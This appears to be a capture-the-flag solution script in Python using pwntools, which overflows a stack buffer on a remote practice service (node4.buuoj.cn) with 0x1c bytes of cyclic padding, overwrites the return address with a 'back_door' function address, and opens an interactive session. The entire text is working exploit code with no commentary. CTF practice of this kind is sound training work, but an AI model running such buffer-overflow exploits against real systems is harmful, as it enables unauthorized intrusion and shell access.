from pwn import *


p = remote("node4.buuoj.cn", 28614)


back_door = 0x0804851B

pad = cyclic(0x18+0x4)+p32(back_door)
p.send(pad)

p.interactive()

